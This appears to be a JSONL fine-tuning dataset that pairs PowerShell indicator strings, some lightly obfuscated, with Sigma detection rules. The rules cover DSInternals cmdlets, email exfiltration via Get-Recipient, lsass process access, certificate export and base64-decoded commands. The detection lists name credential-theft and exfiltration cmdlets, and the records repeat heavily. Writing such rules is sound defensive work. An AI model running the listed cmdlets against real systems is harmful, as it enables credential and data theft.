Write-ADNgcKey Write-ADReplNgcKey", "output": "title: DSInternals Suspicious PowerShell Cmdlets\nid: 43d91656-a9b2-4541-b7e2-6a9bd3a13f4e\nrelated:\n    - id: 846c7a87-8e14-4569-9d49-ecfd4276a01c\n      type: similar\nstatus: test\ndescription: |\n    Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\n    The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\nreferences:\n    - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.PowerShell/DSInternals.psd1\nauthor: Nasreddine Bencherchali (Nextron Systems), Nounou Mbeiri\ndate: 2024-06-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Add-ADDBSidHistory'\n            - 'Add-ADNgcKey'\n            - 'Add-ADReplNgcKey'\n            - 'ConvertFrom-ADManagedPasswordBlob'\n            - 'ConvertFrom-GPPrefPassword'\n            - 'ConvertFrom-ManagedPasswordBlob'\n            - 'ConvertFrom-UnattendXmlPassword'\n            - 'ConvertFrom-UnicodePassword'\n            - 'ConvertTo-AADHash'\n            - 'ConvertTo-GPPrefPassword'\n            - 'ConvertTo-KerberosKey'\n            - 'ConvertTo-LMHash'\n            - 'ConvertTo-MsoPasswordHash'\n            - 'ConvertTo-NTHash'\n            - 'ConvertTo-OrgIdHash'\n            - 'ConvertTo-UnicodePassword'\n            - 'Disable-ADDBAccount'\n            - 'Enable-ADDBAccount'\n            - 'Get-ADDBAccount'\n            - 'Get-ADDBBackupKey'\n            - 'Get-ADDBDomainController'\n            - 'Get-ADDBGroupManagedServiceAccount'\n            - 'Get-ADDBKdsRootKey'\n            - 'Get-ADDBSchemaAttribute'\n            - 'Get-ADDBServiceAccount'\n            - 'Get-ADDefaultPasswordPolicy'\n            - 'Get-ADKeyCredential' # Covers 'Get-ADKeyCredentialLink'\n            - 'Get-ADPasswordPolicy'\n            - 'Get-ADReplAccount'\n            - 'Get-ADReplBackupKey'\n            - 'Get-ADReplicationAccount'\n            - 'Get-ADSIAccount'\n            - 'Get-AzureADUserEx'\n            - 'Get-BootKey'\n            - 'Get-KeyCredential'\n            - 'Get-LsaBackupKey'\n            - 'Get-LsaPolicy' # Covers 'Get-LsaPolicyInformation'\n            - 'Get-SamPasswordPolicy'\n            - 'Get-SysKey'\n            - 'Get-SystemKey'\n            - 'New-ADDBRestoreFromMediaScript'\n            - 'New-ADKeyCredential' # Covers 'New-ADKeyCredentialLink'\n            - 'New-ADNgcKey'\n            - 'New-NTHashSet'\n            - 'Remove-ADDBObject'\n            - 'Save-DPAPIBlob'\n            - 'Set-ADAccountPasswordHash'\n            - 'Set-ADDBAccountPassword' # Covers 'Set-ADDBAccountPasswordHash'\n            - 'Set-ADDBBootKey'\n            - 'Set-ADDBDomainController'\n            - 'Set-ADDBPrimaryGroup'\n            - 'Set-ADDBSysKey'\n            - 'Set-AzureADUserEx'\n            - 'Set-LsaPolicy' # Covers 'Set-LSAPolicyInformation'\n            - 'Set-SamAccountPasswordHash'\n            - 'Set-WinUserPasswordHash'\n            - 'Test-ADDBPasswordQuality'\n            - 'Test-ADPasswordQuality'\n            - 'Test-ADReplPasswordQuality'\n            - 'Test-PasswordQuality'\n            - 'Unlock-ADDBAccount'\n            - 'Write-ADNgcKey'\n            - 'Write-ADReplNgcKey'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of DSInternals for administration or audit purpose.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-ADDBSidHistory Add-ADNgcKey Add-ADReplNgcKey ConvertFrom-ADManagedPasswordBlob ConvertFrom-GPPrefPassword ConvertFrom-ManagedPasswordBlob ConvertFrom-UnattendXmlPassword ConvertFrom-UnicodePassword ConvertTo-AADHash ConvertTo-GPPrefPassword ConvertTo-KerberosKey ConvertTo-LMHash ConvertTo-MsoPasswordHash ConvertTo-NTHash ConvertTo-OrgIdHash ConvertTo-UnicodePassword Disable-ADDBAccount Enable-ADDBAccount Get-ADDBAccount Get-ADDBBackupKey Get-ADDBDomainController Get-ADDBGroupManagedServiceAccount Get-ADDBKdsRootKey Get-ADDBSchemaAttribute Get-ADDBServiceAccount Get-ADDefaultPasswordPolicy Get-ADKeyCredential Get-ADPasswordPolicy Get-ADReplAccount Get-ADReplBackupKey Get-ADReplicationAccount Get-ADSIAccount Get-AzureADUserEx Get-BootKey Get-KeyCredential Get-LsaBackupKey Get-LsaPolicy Get-SamPasswordPolicy Get-SysKey Get-SystemKey New-ADDBRestoreFromMediaScript New-ADKeyCredential New-ADNgcKey New-NTHashSet Remove-ADDBObject Save-DPAPIBlob Set-ADAccountPasswordHash Set-ADDBAccountPassword Set-ADDBBootKey Set-ADDBDomainController Set-ADDBPrimaryGroup Set-ADDBSysKey Set-AzureADUserEx Set-LsaPolicy Set-SamAccountPasswordHash Set-WinUserPasswordHash Test-ADDBPasswordQuality Test-ADPasswordQuality Test-ADReplPasswordQuality Test-PasswordQuality Unlock-ADDBAccount Write-ADNgcKey Write-ADReplNgcKey", "output": "title: DSInternals Suspicious PowerShell Cmdlets\nid: 43d91656-a9b2-4541-b7e2-6a9bd3a13f4e\nrelated:\n    - id: 846c7a87-8e14-4569-9d49-ecfd4276a01c\n      type: similar\nstatus: test\ndescription: |\n    Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\n    The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\nreferences:\n    - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.PowerShell/DSInternals.psd1\nauthor: Nasreddine Bencherchali (Nextron Systems), Nounou Mbeiri\ndate: 2024-06-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Add-ADDBSidHistory'\n            - 'Add-ADNgcKey'\n            - 'Add-ADReplNgcKey'\n            - 'ConvertFrom-ADManagedPasswordBlob'\n            - 'ConvertFrom-GPPrefPassword'\n            - 'ConvertFrom-ManagedPasswordBlob'\n            - 'ConvertFrom-UnattendXmlPassword'\n            - 'ConvertFrom-UnicodePassword'\n            - 'ConvertTo-AADHash'\n            - 'ConvertTo-GPPrefPassword'\n            - 'ConvertTo-KerberosKey'\n            - 'ConvertTo-LMHash'\n            - 'ConvertTo-MsoPasswordHash'\n            - 'ConvertTo-NTHash'\n            - 'ConvertTo-OrgIdHash'\n            - 'ConvertTo-UnicodePassword'\n            - 'Disable-ADDBAccount'\n            - 'Enable-ADDBAccount'\n            - 'Get-ADDBAccount'\n            - 'Get-ADDBBackupKey'\n            - 'Get-ADDBDomainController'\n            - 'Get-ADDBGroupManagedServiceAccount'\n            - 'Get-ADDBKdsRootKey'\n            - 'Get-ADDBSchemaAttribute'\n            - 'Get-ADDBServiceAccount'\n            - 'Get-ADDefaultPasswordPolicy'\n            - 'Get-ADKeyCredential' # Covers 'Get-ADKeyCredentialLink'\n            - 'Get-ADPasswordPolicy'\n            - 'Get-ADReplAccount'\n            - 'Get-ADReplBackupKey'\n            - 'Get-ADReplicationAccount'\n            - 'Get-ADSIAccount'\n            - 'Get-AzureADUserEx'\n            - 'Get-BootKey'\n            - 'Get-KeyCredential'\n            - 'Get-LsaBackupKey'\n            - 'Get-LsaPolicy' # Covers 'Get-LsaPolicyInformation'\n            - 'Get-SamPasswordPolicy'\n            - 'Get-SysKey'\n            - 'Get-SystemKey'\n            - 'New-ADDBRestoreFromMediaScript'\n            - 'New-ADKeyCredential' # Covers 'New-ADKeyCredentialLink'\n            - 'New-ADNgcKey'\n            - 'New-NTHashSet'\n            - 'Remove-ADDBObject'\n            - 'Save-DPAPIBlob'\n            - 'Set-ADAccountPasswordHash'\n            - 'Set-ADDBAccountPassword' # Covers 'Set-ADDBAccountPasswordHash'\n            - 'Set-ADDBBootKey'\n            - 'Set-ADDBDomainController'\n            - 'Set-ADDBPrimaryGroup'\n            - 'Set-ADDBSysKey'\n            - 'Set-AzureADUserEx'\n            - 'Set-LsaPolicy' # Covers 'Set-LSAPolicyInformation'\n            - 'Set-SamAccountPasswordHash'\n            - 'Set-WinUserPasswordHash'\n            - 'Test-ADDBPasswordQuality'\n            - 'Test-ADPasswordQuality'\n            - 'Test-ADReplPasswordQuality'\n            - 'Test-PasswordQuality'\n            - 'Unlock-ADDBAccount'\n            - 'Write-ADNgcKey'\n            - 'Write-ADReplNgcKey'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of DSInternals for administration or audit purpose.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe Add-PSSnapin Get-Recipient -ExpandProperty EmailAddresses SmtpAddress -hidetableheaders", "output": "title: Email Exifiltration Via Powershell\nid: 312d0384-401c-4b8b-abdf-685ffba9a332\nstatus: test\ndescription: Detects email exfiltration via powershell cmdlets\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\n    - https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml\nauthor: Nasreddine Bencherchali (Nextron Systems),  Azure-Sentinel (idea)\ndate: 2022-09-09\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Add-PSSnapin'\n            - 'Get-Recipient'\n            - '-ExpandProperty'\n            - 'EmailAddresses'\n            - 'SmtpAddress'\n            - '-hidetableheaders'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe Add-PSSnapin Get-Recipient -ExpandProperty EmailAd\\\"dresses\\\" SmtpAddress -hidetableheaders", "output": "title: Email Exifiltration Via Powershell\nid: 312d0384-401c-4b8b-abdf-685ffba9a332\nstatus: test\ndescription: Detects email exfiltration via powershell cmdlets\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\n    - https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml\nauthor: Nasreddine Bencherchali (Nextron Systems),  Azure-Sentinel (idea)\ndate: 2022-09-09\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Add-PSSnapin'\n            - 'Get-Recipient'\n            - '-ExpandProperty'\n            - 'EmailAddresses'\n            - 'SmtpAddress'\n            - '-hidetableheaders'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell \\pwsh Add-PSSnapin Get-Recipient -ExpandProperty EmailAddresses SmtpAddress -hidetableheaders", "output": "title: Email Exifiltration Via Powershell\nid: 312d0384-401c-4b8b-abdf-685ffba9a332\nstatus: test\ndescription: Detects email exfiltration via powershell cmdlets\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\n    - https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml\nauthor: Nasreddine Bencherchali (Nextron Systems),  Azure-Sentinel (idea)\ndate: 2022-09-09\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Add-PSSnapin'\n            - 'Get-Recipient'\n            - '-ExpandProperty'\n            - 'EmailAddresses'\n            - 'SmtpAddress'\n            - '-hidetableheaders'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe Add-PSSnapin Get-Recipient -ExpandProperty EmailAddresses SmtpAddress -hidetableheaders", "output": "title: Email Exifiltration Via Powershell\nid: 312d0384-401c-4b8b-abdf-685ffba9a332\nstatus: test\ndescription: Detects email exfiltration via powershell cmdlets\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\n    - https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml\nauthor: Nasreddine Bencherchali (Nextron Systems),  Azure-Sentinel (idea)\ndate: 2022-09-09\ntags:\n    - attack.exfiltration\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Add-PSSnapin'\n            - 'Get-Recipient'\n            - '-ExpandProperty'\n            - 'EmailAddresses'\n            - 'SmtpAddress'\n            - '-hidetableheaders'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Enable-WindowsOptionalFeature -Online -FeatureName TelnetServer Internet-Explorer-Optional-amd64 TFTP SMB1Protocol Client-ProjFS Microsoft-Windows-Subsystem-Linux", "output": "title: Potential Suspicious Windows Feature Enabled - ProcCreation\nid: c740d4cf-a1e9-41de-bb16-8a46a4f57918\nrelated:\n    - id: 55c925c1-7195-426b-a136-a9396800e29b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\n    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature?view=windowsserver2022-ps\n    - https://learn.microsoft.com/en-us/windows/win32/projfs/enabling-windows-projected-file-system\n    - https://learn.microsoft.com/en-us/windows/wsl/install-on-server\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-29\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        CommandLine|contains|all:\n            - 'Enable-WindowsOptionalFeature'\n            - '-Online'\n            - '-FeatureName'\n    selection_feature:\n        # Add any insecure/unusual windows features that you don't use in your environment\n        CommandLine|contains:\n            - 'TelnetServer'\n            - 'Internet-Explorer-Optional-amd64'\n            - 'TFTP'\n            - 'SMB1Protocol'\n            - 'Client-ProjFS'\n            - 'Microsoft-Windows-Subsystem-Linux'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the features listed in the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Enable-WindowsOptionalFeature -Online -FeatureName TelnetServer Internet-Explorer-Optional-amd64 TF\\\"TP\\\" SMB1Protocol Client-ProjFS Microsoft-Windows-Subsystem-Linux", "output": "title: Potential Suspicious Windows Feature Enabled - ProcCreation\nid: c740d4cf-a1e9-41de-bb16-8a46a4f57918\nrelated:\n    - id: 55c925c1-7195-426b-a136-a9396800e29b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\n    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature?view=windowsserver2022-ps\n    - https://learn.microsoft.com/en-us/windows/win32/projfs/enabling-windows-projected-file-system\n    - https://learn.microsoft.com/en-us/windows/wsl/install-on-server\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-29\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        CommandLine|contains|all:\n            - 'Enable-WindowsOptionalFeature'\n            - '-Online'\n            - '-FeatureName'\n    selection_feature:\n        # Add any insecure/unusual windows features that you don't use in your environment\n        CommandLine|contains:\n            - 'TelnetServer'\n            - 'Internet-Explorer-Optional-amd64'\n            - 'TFTP'\n            - 'SMB1Protocol'\n            - 'Client-ProjFS'\n            - 'Microsoft-Windows-Subsystem-Linux'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the features listed in the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Enable-WindowsOptionalFeature -Online -FeatureName TelnetServer Internet-Explorer-Optional-amd64 TFTP SMB1Protocol Client-ProjFS Microsoft-Windows-Subsystem-Linux", "output": "title: Potential Suspicious Windows Feature Enabled - ProcCreation\nid: c740d4cf-a1e9-41de-bb16-8a46a4f57918\nrelated:\n    - id: 55c925c1-7195-426b-a136-a9396800e29b\n      type: similar\nstatus: test\ndescription: |\n    Detects usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\n    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature?view=windowsserver2022-ps\n    - https://learn.microsoft.com/en-us/windows/win32/projfs/enabling-windows-projected-file-system\n    - https://learn.microsoft.com/en-us/windows/wsl/install-on-server\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-29\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        CommandLine|contains|all:\n            - 'Enable-WindowsOptionalFeature'\n            - '-Online'\n            - '-FeatureName'\n    selection_feature:\n        # Add any insecure/unusual windows features that you don't use in your environment\n        CommandLine|contains:\n            - 'TelnetServer'\n            - 'Internet-Explorer-Optional-amd64'\n            - 'TFTP'\n            - 'SMB1Protocol'\n            - 'Client-ProjFS'\n            - 'Microsoft-Windows-Subsystem-Linux'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the features listed in the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "iex Invoke-Expression Invoke-Command icm cat get-content type -raw", "output": "title: Powershell Inline Execution From A File\nid: ee218c12-627a-4d27-9e30-d6fb2fe22ed2\nstatus: test\ndescription: Detects inline execution of PowerShell code from a file\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=50\nauthor: frack113\ndate: 2022-12-25\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_exec:\n        CommandLine|contains:\n            - 'iex '\n            - 'Invoke-Expression '\n            - 'Invoke-Command '\n            - 'icm '\n    selection_read:\n        CommandLine|contains:\n            - 'cat '\n            - 'get-content '\n            - 'type '\n    selection_raw:\n        CommandLine|contains: ' -raw'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "iex Invoke-Expression Invoke-Command icm cat get-content \\\"type\\\" -raw", "output": "title: Powershell Inline Execution From A File\nid: ee218c12-627a-4d27-9e30-d6fb2fe22ed2\nstatus: test\ndescription: Detects inline execution of PowerShell code from a file\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=50\nauthor: frack113\ndate: 2022-12-25\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_exec:\n        CommandLine|contains:\n            - 'iex '\n            - 'Invoke-Expression '\n            - 'Invoke-Command '\n            - 'icm '\n    selection_read:\n        CommandLine|contains:\n            - 'cat '\n            - 'get-content '\n            - 'type '\n    selection_raw:\n        CommandLine|contains: ' -raw'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "iex Invoke-Expression Invoke-Command icm cat get-content type -raw", "output": "title: Powershell Inline Execution From A File\nid: ee218c12-627a-4d27-9e30-d6fb2fe22ed2\nstatus: test\ndescription: Detects inline execution of PowerShell code from a file\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=50\nauthor: frack113\ndate: 2022-12-25\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_exec:\n        CommandLine|contains:\n            - 'iex '\n            - 'Invoke-Expression '\n            - 'Invoke-Command '\n            - 'icm '\n    selection_read:\n        CommandLine|contains:\n            - 'cat '\n            - 'get-content '\n            - 'type '\n    selection_raw:\n        CommandLine|contains: ' -raw'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Export-PfxCertificate Export-Certificate", "output": "title: Certificate Exported Via PowerShell\nid: 9e716b33-63b2-46da-86a4-bd3c3b9b5dfb\nrelated:\n    - id: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c\n      type: similar\nstatus: test\ndescription: Detects calls to cmdlets that are used to export certificates from the local certificate store. Threat actors were seen abusing this to steal private keys from compromised machines.\nreferences:\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a\n    - https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate?view=windowsserver2022-ps\n    - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-18\ntags:\n    - attack.credential-access\n    - attack.execution\n    - attack.t1552.004\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Export-PfxCertificate '\n            - 'Export-Certificate '\n    condition: selection\nfalsepositives:\n    - Legitimate certificate exports by administrators. Additional filters might be required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Export-PfxCertificate Export-Ce\\\"rtificate\\\"", "output": "title: Certificate Exported Via PowerShell\nid: 9e716b33-63b2-46da-86a4-bd3c3b9b5dfb\nrelated:\n    - id: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c\n      type: similar\nstatus: test\ndescription: Detects calls to cmdlets that are used to export certificates from the local certificate store. Threat actors were seen abusing this to steal private keys from compromised machines.\nreferences:\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a\n    - https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate?view=windowsserver2022-ps\n    - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-18\ntags:\n    - attack.credential-access\n    - attack.execution\n    - attack.t1552.004\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Export-PfxCertificate '\n            - 'Export-Certificate '\n    condition: selection\nfalsepositives:\n    - Legitimate certificate exports by administrators. Additional filters might be required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Export-PfxCertificate Export-Certificate", "output": "title: Certificate Exported Via PowerShell\nid: 9e716b33-63b2-46da-86a4-bd3c3b9b5dfb\nrelated:\n    - id: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c\n      type: similar\nstatus: test\ndescription: Detects calls to cmdlets that are used to export certificates from the local certificate store. Threat actors were seen abusing this to steal private keys from compromised machines.\nreferences:\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a\n    - https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate?view=windowsserver2022-ps\n    - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-18\ntags:\n    - attack.credential-access\n    - attack.execution\n    - attack.t1552.004\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Export-PfxCertificate '\n            - 'Export-Certificate '\n    condition: selection\nfalsepositives:\n    - Legitimate certificate exports by administrators. Additional filters might be required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "FromBase64String MemoryStream H4sI", "output": "title: Base64 Encoded PowerShell Command Detected\nid: e32d4572-9826-4738-b651-95fa63747e8a\nstatus: test\ndescription: Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string\nreferences:\n    - https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-01-29\nmodified: 2023-01-26\ntags:\n    - attack.t1027\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1140\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '::FromBase64String('\n    condition: selection\nfalsepositives:\n    - Administrative script libraries\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "FromBase64String MemoryStream \"H4sI\"", "output": "title: Base64 Encoded PowerShell Command Detected\nid: e32d4572-9826-4738-b651-95fa63747e8a\nstatus: test\ndescription: Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string\nreferences:\n    - https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-01-29\nmodified: 2023-01-26\ntags:\n    - attack.t1027\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1140\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '::FromBase64String('\n    condition: selection\nfalsepositives:\n    - Administrative script libraries\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "FromBase64String H4sI MemoryStream", "output": "title: Base64 Encoded PowerShell Command Detected\nid: e32d4572-9826-4738-b651-95fa63747e8a\nstatus: test\ndescription: Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string\nreferences:\n    - https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-01-29\nmodified: 2023-01-26\ntags:\n    - attack.t1027\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1140\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '::FromBase64String('\n    condition: selection\nfalsepositives:\n    - Administrative script libraries\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Get-Process lsas ps lsas gps lsas", "output": "title: PowerShell Get-Process LSASS\nid: b2815d0d-7481-4bf0-9b6c-a4c48a94b349\nstatus: test\ndescription: Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity\nreferences:\n    - https://web.archive.org/web/20220205033028/https://twitter.com/PythonResponder/status/1385064506049630211\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-23\nmodified: 2023-01-05\ntags:\n    - attack.credential-access\n    - attack.t1552.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # You can add more permutation as you see fit\n            - 'Get-Process lsas'\n            - 'ps lsas'\n            - 'gps lsas'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Get-Process lsas \"ps\" \"lsas\" gps lsas", "output": "title: PowerShell Get-Process LSASS\nid: b2815d0d-7481-4bf0-9b6c-a4c48a94b349\nstatus: test\ndescription: Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity\nreferences:\n    - https://web.archive.org/web/20220205033028/https://twitter.com/PythonResponder/status/1385064506049630211\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-23\nmodified: 2023-01-05\ntags:\n    - attack.credential-access\n    - attack.t1552.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # You can add more permutation as you see fit\n            - 'Get-Process lsas'\n            - 'ps lsas'\n            - 'gps lsas'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
